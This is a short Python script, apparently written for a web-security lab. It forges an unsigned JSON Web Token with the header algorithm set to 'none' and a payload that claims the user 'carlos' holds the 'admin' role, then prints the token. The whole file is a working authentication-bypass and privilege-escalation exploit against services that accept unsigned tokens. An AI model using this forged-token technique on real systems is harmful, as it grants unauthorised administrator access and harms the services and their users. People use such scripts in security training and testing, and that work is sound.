import base64
import json

def b64url_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

# Set JWT header with alg "none"
header = {
    "alg": "none",
    "typ": "JWT"
}

# Modify payload (e.g., escalate privileges)
payload = {
    "username": "carlos",
    "role": "admin"
}

# Encode header and payload
encoded_header = b64url_encode(header)
encoded_payload = b64url_encode(payload)

# Construct the unsigned token (no signature)
token = f"{encoded_header}.{encoded_payload}."

print("[+] JWT with alg=none:")
print(token)
